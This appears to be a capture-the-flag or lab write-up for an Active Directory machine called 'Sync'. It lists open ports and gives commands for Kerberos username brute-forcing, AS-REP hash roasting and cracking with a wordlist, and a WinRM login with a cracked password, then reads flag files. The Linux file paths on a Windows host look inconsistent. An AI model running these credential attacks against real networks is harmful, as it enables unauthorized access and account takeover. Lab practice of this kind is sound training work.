# Sync

**IP Address:** 172.31.3.6

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3268/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 3269/tcp | open | tcpwrapped |   |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 389/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 445/tcp | open | microsoft-ds |   |
| 464/tcp | open | kpasswd5 |   |
| 47001/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 49664/tcp | open | msrpc | Microsoft Windows RPC  |
| 49665/tcp | open | msrpc | Microsoft Windows RPC  |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49668/tcp | open | msrpc | Microsoft Windows RPC  |
| 49669/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 49670/tcp | open | msrpc | Microsoft Windows RPC  |
| 49673/tcp | open | msrpc | Microsoft Windows RPC  |
| 49674/tcp | open | msrpc | Microsoft Windows RPC  |
| 49690/tcp | open | msrpc | Microsoft Windows RPC  |
| 49698/tcp | open | msrpc | Microsoft Windows RPC  |
| 49790/tcp | open | msrpc | Microsoft Windows RPC  |
| 53/tcp | open | domain | Simple DNS Plus  |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 636/tcp | open | tcpwrapped |   |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos  |
| 9389/tcp | open | mc-nmf | .NET Message Framing  |
| 123/udp | open | ntp | NTP v3 |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 49152/udp | open | domain |   |
| 53/udp | open | domain |   |

1. Attempt to brute force some usernames. 

Commands
```
kerbrute -users /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -domain sync.csl -dc-ip $ip
```

![Execute Exploit](images/exploit1.png)

2. Put found users into users.txt and attempt to get some hashes and crack them. 

Commands
```
GetNPUsers.py sync.csl/ -usersfile users.txt -format john -outputfile hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/exploit2.png)

3. 
Commands
```
evil-winrm -i $ip -u manager -p '!!MILKSHAKE!!'
```
!!MILKSHAKE!!                          

Commands
```
whoami
cat /var/www/local.txt
```

![Execute Exploit](images/exploit1.png)


Commands
```bash
whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
local.txt

proof.txt

```